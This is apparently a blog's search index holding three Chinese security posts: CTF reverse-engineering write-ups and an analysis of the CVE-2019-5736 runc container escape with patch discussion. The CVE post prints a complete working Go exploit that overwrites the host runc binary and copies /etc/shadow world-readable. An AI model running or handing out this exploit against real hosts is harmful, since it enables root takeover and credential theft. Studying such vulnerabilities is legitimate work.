<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>记一道加了VMP壳的Re</title>
    <url>/2019/02/15/VMP-Re/</url>
    <content><![CDATA[<p>忘记了是从哪里得到的这道题了，看雪还是吾爱，当时看加了VMP壳，挺感兴趣的就下载下来了</p>
<p>查壳一看是VMP，那么暂时就放弃了IDA静态分析，作为一道CTF题，不可能难度大到要去脱强壳吧，更别说后续的修复IAT表了，于是用OD，开始动态分析吧</p>
<p><a href="https://imgchr.com/i/kLjsPg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLjsPg.jpg" alt="kLjsPg.jpg"></a></p>
<p>从控制台输入一串字符串，错误的话直接就退出程序了，搜索字符串的法子也行不通 直接下API断点ExitProcess,想通过会回溯栈里的内容找到一些关键的地方，最好能跳回程序领空，回溯到这里的时候，我发现已经到了ucrtbase的领空了，通过调用ucrtbase.exit再调用了kernel.exit()实现了退出</p>
<p><a href="https://imgchr.com/i/kLjcxs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLjcxs.jpg" alt="kLjcxs.jpg"></a></p>
<p>然后在一直一点点翻着栈，突然看到了一片空间里全写着ucrtbase的函数,其中很关键的ucrtbase.gets_s，ctrl+n查了一下，确实有这个函数，下断点，重新运行程序输入，果然断下来了，找到了程序算法的关键地方  </p>
<p><a href="https://imgchr.com/i/kLjDIS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLjDIS.jpg" alt="kLjDIS.jpg"></a></p>
<p>虽然因为壳的原因没有直接显示函数名称，但是根据传入参数，数据窗口跟踪还是可以判断出功能</p>
<p><a href="https://imgchr.com/i/kLj62j" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLj62j.jpg" alt="kLj62j.jpg"></a></p>
<p>看到了TEA算法的特征：<strong>0x9E3779B9</strong></p>
<p><a href="https://imgchr.com/i/kLjyGQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLjyGQ.jpg" alt="kLjyGQ.jpg"></a></p>
<p>TEA算法32次循环，64轮</p>
<p><a href="https://imgchr.com/i/kLjBa8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLjBa8.jpg" alt="kLjBa8.jpg"></a></p>
<p>key的具体值为：<a href="https://imgchr.com/i/kLvZo8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLvZo8.jpg" alt="kLvZo8.jpg"></a></p>
<p>TEA加密之后的值与固定的0x18字节的字符串相比较</p>
<p><code>BD D5 18 B7 CB 7D 89 98 C2 5B 7E B8 BF 43 72 75 B5 F9 AF D9 72 F6 AF 63</code></p>
<p>到这里的话其实需要我们输入的字符串已经可以算出来了，我们知道加密后的值，key,TEA算法解密就行了<br>TEA解密脚本摘自某位女大佬，虽然我不认识</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line"></span><br><span class="line">//加密函数</span><br><span class="line">void encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i &lt; 32; i++) &#123;                       /* basic cycle start */</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//解密函数</span><br><span class="line">void decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  /* set up */</span><br><span class="line">    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */</span><br><span class="line">    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */</span><br><span class="line">    for (i=0; i&lt;32; i++) &#123;                         /* basic cycle start */</span><br><span class="line">        v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                              /* end cycle */</span><br><span class="line">    v[0]=v0; v[1]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t k[4]=&#123;0x00000676,0x0000DEAD,0x0000BEEF,0x00001234&#125;;</span><br><span class="line">    // v为要加密的数据是两个32位无符号整数</span><br><span class="line">    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br><span class="line"></span><br><span class="line">    //exchange scale</span><br><span class="line">    uint32_t flagLong1[2]=&#123;0xB718D5BD,0x98897DCB&#125;;</span><br><span class="line">    uint32_t flagLong2[2]=&#123;0xB87E58C2,0x757243BF&#125;;</span><br><span class="line">    uint32_t flagLong3[2]=&#123;0xD9AFF9B5,0x63AFF672&#125;;</span><br><span class="line"> </span><br><span class="line">    decrypt(flagLong1,k);</span><br><span class="line">    decrypt(flagLong2,k);</span><br><span class="line">	decrypt(flagLong3,k);</span><br><span class="line">	</span><br><span class="line">    printf(&quot;%x%x%x%x%x%x&quot;,flagLong1[0],flagLong1[1],flagLong2[0],flagLong2[1],flagLong3[0],flagLong3[1]);</span><br><span class="line">	// </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解出：6563694e65654d324e1d1a30ddb7d075646e6569616b616b<br>十六进制大端序，每4字节转换成小端序再转换成字符得到 Nice2MeetY0uMy4riendkaka</p>
<p>但这个题还没有结束，我们输入的字符串还需要与<strong>0x157010</strong>地址的一大串数值进行0x9CB轮异或运算，运算后的结果放回0x157010中，并写出到文件data.exe中，之前尝试过直接爆破，但是解密出来的文件不正确</p>
<p><a href="https://imgchr.com/i/kLj2Mn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLj2Mn.jpg" alt="kLj2Mn.jpg"></a></p>
<p>data.exe运行不了，用010editor查看，很明显的PNG格式图片，但是文件头和宽度异常，文件头固定的修改为</p>
<p><code>89 50 4E 47 0D 0A 1A 0A</code></p>
<p>宽度需要根据 IHDR 块的 CRC 值爆破得到，脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">crc32key = 0x1AE6B472</span><br><span class="line">n = 65535</span><br><span class="line">for w in range(n):</span><br><span class="line">    width = struct.pack(&apos;&gt;i&apos;, w)</span><br><span class="line">    data = &apos;\x49\x48\x44\x52&apos;+width+&apos;\x00\x00\x00\x69\x08\x06\x00\x00\x00&apos;</span><br><span class="line">    crc32result = binascii.crc32(data)</span><br><span class="line">    if crc32result == crc32key:</span><br><span class="line">        print repr(width)</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/kLjqMR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLjqMR.jpg" alt="kLjqMR.jpg"></a></p>
<p>修改好宽度后打开图片，显示只有一半flag，估计还涉及到隐写部分，总之没研究出来。</p>
<p><a href="https://imgchr.com/i/VzGhVg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/21/VzGhVg.jpg" alt="VzGhVg.jpg"></a></p>
]]></content>
      <tags>
        <tag>re</tag>
        <tag>vmp</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-5736 docker逃逸分析</title>
    <url>/2019/05/14/CVE-2019-5736-docker%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>runc是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI tool，目前Docker、Containerd和CRI-O等容器都运行在runc之上。</p>
<p>该漏洞允许恶意容器(以最少的用户交互)覆盖 host 上的runC 文件，从而在 host 上以root 权限执行代码。在下面两种情况下，通过用户交互可以在容器中以root 权限执行任意代码：</p>
<ol>
<li><p>使用攻击者控制的映像创建新容器。</p>
</li>
<li><p>将（docker exec）附加到攻击者之前具有写入权限的现有容器中。</p>
</li>
</ol>
<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><ul>
<li>Ubuntu：runc 1.0.0~rc4+dfsg1-6ubuntu0.18.10.1之前版本</li>
<li>Debian：runc 0.1.1+dfsg1-2 之前版本</li>
<li>RedHat Enterprise Linux： docker 1.13.1-91.git07f3374.el7之前版本</li>
<li>Amazon Linux：docker 18.06.1ce-7.25.amzn1.x86_64之前版本</li>
<li>CoreOS：2051.0.0之前版本</li>
<li>Kops Debian 所有版本（正在修复）</li>
<li>Docker：18.09.2之前版本</li>
</ul>
<p>看了漏洞影响之后，emm，感觉范围并不大，对相关版本的要求挺苛刻的，原因在于要考虑到POC的稳定性和可靠性，所以在有些版本下也会复现失败</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ul>
<li>ubuntu16.04</li>
<li>go语言编译环境</li>
<li>docker 18.03.1-ce</li>
</ul>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>与漏洞相关的两条命令如下：</p>
<ul>
<li>/ proc / self / exe - 进程正在运行的可执行文件的符号链接</li>
<li>/ proc / self / fd - 包含进程打开的文件描述符的目录</li>
</ul>
<p>我们可以用 ls -l /proc/self列出/proc/self下的文件</p>
<p>可以看到访问/proc/self的是我们的’ls’进程<br><a href="https://imgchr.com/i/ZuWiGj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/27/ZuWiGj.jpg" alt="ZuWiGj.jpg"></a></p>
<p>这里可以看到/proc/{pid}/exe就是指向的所运行的文件</p>
<p><a href="https://imgchr.com/i/ZuWPiQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/27/ZuWPiQ.jpg" alt="ZuWPiQ.jpg"></a></p>
<p>通过 <code>docker exec -it xxx /bin/bash</code>，可以进入容器内执行命令，需要想办法拿到 runc 的pid 从而获取 runc 的软链接</p>
<p>当用户调用docker exec的时候，相当于runc 调用/bin/sh,而/bin/sh被我们改为#!/proc/self/exe，即runc运行自身，而runc自身也被我们修改了，所以相当于runc执行了我们的代码</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
<li><p>将<code>/bin/sh</code>替换为<code>#!/proc/self/exe</code></p>
</li>
<li><p>寻找runc的pid，获取runc的软连接</p>
</li>
<li><p>获取其文件描述符<code>fd</code>,进行写操作</p>
</li>
<li><p>尝试写入payload,写成功之后覆盖原有runc</p>
</li>
</ol>
<h5 id="1-exec-poc"><a href="#1-exec-poc" class="headerlink" title="1.exec poc"></a>1.exec poc</h5><p>这个POC相当于一个trap，攻击者需要获取容器中的命令执行，并监听一个恶意二进制文件。如果有攻击者或受害者使用docker exec进入容器，就会触发漏洞利用，恶意代码就可以以root权限运行（go语言）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">// Implementation of CVE-2019-5736</span><br><span class="line">// Created with help from @singe, @_cablethief, and @feexd.</span><br><span class="line">// This commit also helped a ton to understand the vuln</span><br><span class="line">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io/ioutil&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;strconv&quot;</span><br><span class="line">    &quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">// This is the line of shell commands that will execute on the host</span><br><span class="line">var payload = &quot;#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    // First we overwrite /bin/sh with the /proc/self/exe interpreter path</span><br><span class="line">    fd, err := os.Create(&quot;/bin/sh&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Fprintln(fd, &quot;#!/proc/self/exe&quot;)</span><br><span class="line">    err = fd.Close()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(&quot;[+] Overwritten /bin/sh successfully&quot;)</span><br><span class="line"></span><br><span class="line">    // Loop through all processes to find one whose cmdline includes runcinit</span><br><span class="line">    // This will be the process created by runc</span><br><span class="line">    var found int</span><br><span class="line">    for found == 0 &#123;</span><br><span class="line">        pids, err := ioutil.ReadDir(&quot;/proc&quot;)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            fmt.Println(err)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">        for _, f := range pids &#123;</span><br><span class="line">            fbytes, _ := ioutil.ReadFile(&quot;/proc/&quot; + f.Name() + &quot;/cmdline&quot;)</span><br><span class="line">            fstring := string(fbytes)</span><br><span class="line">            if strings.Contains(fstring, &quot;runc&quot;) &#123;</span><br><span class="line">                fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())</span><br><span class="line">                found, err = strconv.Atoi(f.Name())</span><br><span class="line">                if err != nil &#123;</span><br><span class="line">                    fmt.Println(err)</span><br><span class="line">                    return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // We will use the pid to get a file handle for runc on the host.</span><br><span class="line">    var handleFd = -1</span><br><span class="line">    for handleFd == -1 &#123;</span><br><span class="line">        // Note, you do not need to use the O_PATH flag for the exploit to work.</span><br><span class="line">        handle, _ := os.OpenFile(&quot;/proc/&quot;+strconv.Itoa(found)+&quot;/exe&quot;, os.O_RDONLY, 0777)</span><br><span class="line">        if int(handle.Fd()) &gt; 0 &#123;</span><br><span class="line">            handleFd = int(handle.Fd())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(&quot;[+] Successfully got the file handle&quot;)</span><br><span class="line"></span><br><span class="line">    // Now that we have the file handle, lets write to the runc binary and overwrite it</span><br><span class="line">    // It will maintain it&apos;s executable flag</span><br><span class="line">    for &#123;</span><br><span class="line">        writeHandle, _ := os.OpenFile(&quot;/proc/self/fd/&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)</span><br><span class="line">        if int(writeHandle.Fd()) &gt; 0 &#123;</span><br><span class="line">            fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)</span><br><span class="line">            writeHandle.Write([]byte(payload))</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-malicious-image-poc"><a href="#2-malicious-image-poc" class="headerlink" title="2.malicious image poc"></a>2.malicious image poc</h5><p>第二个POC创建了一个恶意Docker镜像。如果该恶意镜像运行就会触发漏洞利用。</p>
<p>漏洞的利用需要在容器内获取root(uid 0)权限</p>
<p>这里简单做了一个演示视频：</p>
<p><a href="https://asciinema.org/a/TpejIJcx0wr60U5zUucYl1cuD" target="_blank" rel="noopener"><img src="https://asciinema.org/a/TpejIJcx0wr60U5zUucYl1cuD.png" alt="asciicast"></a></p>
<h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>在补丁中新增了一些函数，用于处理克隆二进制文件，关键在于新增加了一个<code>nsexec()</code>函数来判断是否来自克隆文件</p>
<p><a href="https://imgchr.com/i/ZyNQij" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/09/ZyNQij.jpg" alt="ZyNQij.jpg"></a></p>
<p><code>ensure_cloned_binary()</code>中又调用了<code>is_self_cloned()</code>方法</p>
<p><a href="https://imgchr.com/i/ZyNyy6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/09/ZyNyy6.jpg" alt="ZyNyy6.jpg"></a></p>
<p>通过对文件描述符执行<code>F_GET_SEALS</code>操作是否成功判断是否为克隆文件描述符</p>
<p><a href="https://imgchr.com/i/ZyNolt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/09/ZyNolt.jpg" alt="ZyNolt.jpg"></a></p>
<p>如果<code>is_self_cloned()</code>的返回值大于0，都会直接返回。否则则执行<code>clone_binary()</code>创建克隆文件</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href>https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p>
<p><a href>https://github.com/twistlock/RunC-CVE-2019-5736</a></p>
<p><a href>https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<p><a href>https://www.twistlock.com/labs-blog/breaking-docker-via-runc-explaining-cve-2019-5736/</a></p>
]]></content>
      <tags>
        <tag>CVE-2019-5736</tag>
        <tag>cve</tag>
        <tag>docker escape</tag>
      </tags>
  </entry>
  <entry>
    <title>2018ISCC_Re_Writeup</title>
    <url>/2018/05/29/2018ISCC/</url>
    <content><![CDATA[<p>本文为2018ISCC比赛逆向题writeup,文章最下面有相关题目、脚本下载</p>
<h5 id="一、RSA256-100pt"><a href="#一、RSA256-100pt" class="headerlink" title="一、RSA256(100pt)"></a>一、RSA256(100pt)</h5><p>题目告知了是RSA算法，RSA算法不多说了<br>下载下来得到三个加密后的文件，和一个公钥(我把题目搞丢了，大概说下思路)</p>
<p>公钥内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----  </span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhANmelSKWptlg38JQSrpUW5RC1gp7npMK  </span><br><span class="line">/0UceOxV1VXrAgMBAAE=  </span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>直接把这个公钥丢到网站在线分析：<a href="http://tool.chacuo.net/cryptrsakeyparse" target="_blank" rel="noopener">RSA公私钥分解</a></p>
<p><a href="https://imgchr.com/i/Chf1oD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/27/Chf1oD.md.jpg" alt="Chf1oD.md.jpg"></a></p>
<p>模数n = D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB</p>
<p>再到网站分解质因数：(注意这里只能填十进制数) <a href="http://factordb.com/" target="_blank" rel="noopener">在线分解质因数</a></p>
<p>q = 302825536744096741518546212761194311477<br>p = 325045504186436346209877301320131277983</p>
<p>这里推荐一个脚本 rsatool.py 专门用于RSA算法的脚本<br>加上参数运行脚本，生成私钥private.pem 命令如下：</p>
<p><code>python rsatool.py -o private.pem -e 65537 -p 302825536744096741518546212761194311477 -q 325045504186436346209877301320131277983t</code></p>
<p>最后再用openssl，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in encrypted.message1 -inkey private.pem -out flag1.dec</span><br><span class="line"></span><br><span class="line">openssl rsautl -decrypt -in encrypted.message2 -inkey private.pem -out flag2.dec</span><br><span class="line">openssl rsautl -decrypt -in encrypted.message3 -inkey private.pem -out flag3.dec</span><br></pre></td></tr></table></figure>

<h5 id="二、My-math-is-bad-150pt"><a href="#二、My-math-is-bad-150pt" class="headerlink" title="二、My math is bad(150pt)"></a>二、My math is bad(150pt)</h5><p>程序是64位elf文件，直接丢入IDA分析，可以知道关键函数两个<strong>400766</strong>和<strong>400B16</strong>，先进入400766函数中：先判断输入长度是否为32，我将这些看起来很乱的变量名称重新命名并设置了Hide casts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  if ( strlen(s0) == 32 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = s4;</span><br><span class="line">    v4 = s5;</span><br><span class="line">    v5 = s6;</span><br><span class="line">    v6 = s7;</span><br><span class="line">    result = 0;</span><br><span class="line">    if ( s1 * *s0 - s3 * s2 == 2652042832920173142LL</span><br><span class="line">      &amp;&amp; 3LL * s2 + 4LL * s3 - s1 - 2LL * *s0 == 397958918</span><br><span class="line">      &amp;&amp; 3 * *s0 * s3 - s2 * s1 == 3345692380376715070LL</span><br><span class="line">      &amp;&amp; 27LL * s1 + *s0 - 11LL * s3 - s2 == 40179413815LL )</span><br><span class="line">    &#123;</span><br><span class="line">      srand(s2 ^ s1 ^ *s0 ^ s3);</span><br><span class="line">      v1 = rand() % 50;</span><br><span class="line">      v2 = rand() % 50;</span><br><span class="line">      v7 = rand() % 50;</span><br><span class="line">      v8 = rand() % 50;</span><br><span class="line">      v9 = rand() % 50;</span><br><span class="line">      v10 = rand() % 50;</span><br><span class="line">      v11 = rand() % 50;</span><br><span class="line">      v12 = rand() % 50;</span><br><span class="line">      if ( v6 * v2 + v3 * v1 - v4 - v5 == 61799700179LL</span><br><span class="line">        &amp;&amp; v6 + v3 + v5 * v8 - v4 * v7 == 48753725643LL</span><br><span class="line">        &amp;&amp; v3 * v9 + v4 * v10 - v5 - v6 == 59322698861LL</span><br><span class="line">        &amp;&amp; v5 * v12 + v3 - v4 - v6 * v11 == 51664230587LL )</span><br><span class="line">      &#123;</span><br><span class="line">        result = 1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以明显看出字符串被分为了8段int型的值(s0~s7)，我们需要先求出前4段，解方程组(四元一次方程组)</p>
<p>z3求解器：z3是由微软公司开发的一个优秀的SMT求解器（也就定理证明器），它能够检查逻辑表达式的可满足性。linux上的安装方法如下：</p>
<p><code>pip install z3-solver</code></p>
<p>安装好后我们就可以在python脚本里调用z3这个库，下面上脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">import struct</span><br><span class="line">s=[Int(&apos;serial%d&apos; % i) for i in range(4)]</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">solver.add(s[1]*s[0]-s[3]*s[2] == 2652042832920173142)</span><br><span class="line">solver.add(s[2]*3+s[3]*4-s[1]-s[0]*2 == 397958918)</span><br><span class="line">solver.add(s[0]*3*s[3]-s[2]*s[1] == 3345692380376715070)</span><br><span class="line">solver.add(s[1]*27+s[0]-s[3]*11-s[2] == 40179413815)</span><br><span class="line"></span><br><span class="line">print(solver.check())  #必须要有这个检查，格式基本固定的</span><br><span class="line">answer=solver.model()</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">for d in s:</span><br><span class="line">	num = answer.eval(d).as_long()</span><br><span class="line">        print hex(num)</span><br><span class="line">	res += struct.pack(&apos;&lt;L&apos;, num)</span><br><span class="line">print repr(res)</span><br></pre></td></tr></table></figure>

<p>通过解此方程组，我们轻易得到了前四段flag</p>
<p>接着随机数种子是前四段异或运算后的值，这里不用去计算它，我们用gdb动态调试  </p>
<p>gdb在0x4008EF下断，一步一步单步走，可以看到随机数种子的值为0x62d793b</p>
<p><img src="https://s1.ax1x.com/2018/05/27/ChvB7Q.png" alt="ChvB7Q.png"></p>
<p>最后获得的伪随机数分别为：0x16,0x27,0x2d,0x2d,0x23,0x29,0xd,0x24<br>下一步再解一个方程组，相同道理，直接上脚本了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">data=[Int(&apos;serial%d&apos; % i) for i in range(4)]</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">v3 = data[0]</span><br><span class="line">v4 = data[1]</span><br><span class="line">v5 = data[2]</span><br><span class="line">v6 = data[3]</span><br><span class="line"></span><br><span class="line">v1 = 0x16</span><br><span class="line">v2 = 0x27</span><br><span class="line">v7 = 0x2d</span><br><span class="line">v8 = 0x2d</span><br><span class="line">v9 = 0x23</span><br><span class="line">v10 = 0x29</span><br><span class="line">v11 = 0xd</span><br><span class="line">v12 = 0x24</span><br><span class="line"></span><br><span class="line">solver.add(v6*v2+v3*v1-v4-v5 == 61799700179)</span><br><span class="line">solver.add(v6+v3+v5*v8-v4*v7 == 48753725643)</span><br><span class="line">solver.add(v3*v9+v4*v10-v5-v6 == 59322698861)</span><br><span class="line">solver.add(v5*v12+v3-v4-v6*v11 == 51664230587)</span><br><span class="line"></span><br><span class="line">print(solver.check())</span><br><span class="line">answer=solver.model()</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">for d in data:</span><br><span class="line">	num = answer.eval(d).as_long()</span><br><span class="line">        print hex(num)</span><br><span class="line">	res += struct.pack(&apos;&lt;L&apos;, num)</span><br><span class="line">print repr(res)</span><br></pre></td></tr></table></figure>

<p>获得整段字符串后，进入400B16函数中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  v35 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  v3 = 39;</span><br><span class="line">  v4 = -20;</span><br><span class="line">  v5 = 19;</span><br><span class="line">  v6 = 1;</span><br><span class="line">  v7 = 7;</span><br><span class="line">  v8 = 6;</span><br><span class="line">  v9 = 52;</span><br><span class="line">  v10 = -61;</span><br><span class="line">  v11 = 72;</span><br><span class="line">  v12 = -57;</span><br><span class="line">  v13 = -33;</span><br><span class="line">  v14 = -79;</span><br><span class="line">  v15 = -97;</span><br><span class="line">  v16 = -37;</span><br><span class="line">  v17 = 25;</span><br><span class="line">  v18 = 45;</span><br><span class="line">  v19 = 4;</span><br><span class="line">  v20 = -15;</span><br><span class="line">  v21 = -111;</span><br><span class="line">  v22 = 10;</span><br><span class="line">  v23 = -94;</span><br><span class="line">  v24 = -46;</span><br><span class="line">  v25 = 21;</span><br><span class="line">  v26 = -43;</span><br><span class="line">  v27 = -19;</span><br><span class="line">  v28 = 53;</span><br><span class="line">  v29 = -112;</span><br><span class="line">  v30 = -36;</span><br><span class="line">  v31 = -44;</span><br><span class="line">  v32 = 60;</span><br><span class="line">  v33 = 63;</span><br><span class="line">  v34 = -12;</span><br><span class="line">  printf(&quot;flag&#123;&quot;);</span><br><span class="line">  for ( i = 0; i &lt; strlen(s0); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    srand(*&amp;s0[i]);</span><br><span class="line">    v0 = rand();</span><br><span class="line">    putchar(*(&amp;v3 + i) ^ v0 % 255);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;&#125;&quot;);</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v35;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是对输入的字符串进行简单的运算：<br>取每个字节作随机数种子，产生伪随机数，然后再与v3开始的数据进行异或操作</p>
<p>直接输入咱们通过计算得到的字符串，即可得到最终的flag</p>
<p><img src="https://s1.ax1x.com/2018/05/28/C4DeeJ.png" alt="C4DeeJ.png"></p>
<h5 id="三、leftright-150pt"><a href="#三、leftright-150pt" class="headerlink" title="三、leftright(150pt)"></a>三、leftright(150pt)</h5><p>拿到题目后发现有UPX壳，不过也不用脱壳，ESP定律直接到达程序入口点<br>先查找一波字符串，发现疑似flag打乱后长度为29的字符串</p>
<p><img src="https://s1.ax1x.com/2018/05/28/ChxrDO.png" alt="ChxrDO.png"></p>
<p>那么如果为了节省时间，自然不必弄清被打乱的流程，先构造一个字符串，小写字母26个+3个数字：abcdefghijklmnopqrstuvwxyz123</p>
<p>用OD动态调试，找到最终字符串比较的地方下断，输入我们构造的字符串，右边的寄存器窗口直接显示了已经打乱后的另一串字符串为：onpqmlrskjtuihvwgfxyedz1cb23a</p>
<p><img src="https://s1.ax1x.com/2018/05/28/ChxsbD.png" alt="ChxsbD.png"></p>
<p>接下来就根据这最终打乱后的每个字符的位置，写出脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str0 = &quot;s_imsaplw_e_siishtnt&#123;g_ialt&#125;F&quot;  </span><br><span class="line">str1 = &quot;abcdefghijklmnopqrstuvwxyz123&quot;  </span><br><span class="line">str2 = &quot;onpqmlrskjtuihvwgfxyedz1cb23a&quot;  </span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in str1:  </span><br><span class="line">    position=str2.find(i)  </span><br><span class="line">    flag+=str0[position]</span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>

<h5 id="四、obfuscation-and-encode（250pt）"><a href="#四、obfuscation-and-encode（250pt）" class="headerlink" title="四、obfuscation and encode（250pt）"></a>四、obfuscation and encode（250pt）</h5><p>这道题做的时间比较长，主要里面有很多混淆的代码，一开始没找到关键的地方</p>
